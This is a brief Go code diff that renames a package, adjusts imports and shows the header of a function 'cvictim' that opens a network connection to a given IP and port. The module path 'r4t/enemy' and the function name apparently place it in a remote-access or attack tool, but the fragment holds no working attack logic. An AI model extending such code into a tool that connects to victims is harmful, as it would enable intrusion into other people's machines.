@@ -1,8 +1,10 @@
-package hconnc
+package econnc
 
 import (
-        "fmt"
-        "net"
+	"fmt"
+	"net"
+
+	"go.r4t/enemy/core/hconnc"
 )
 
 func cvictim(IP string, Port string)(connc net.Conn, err error){
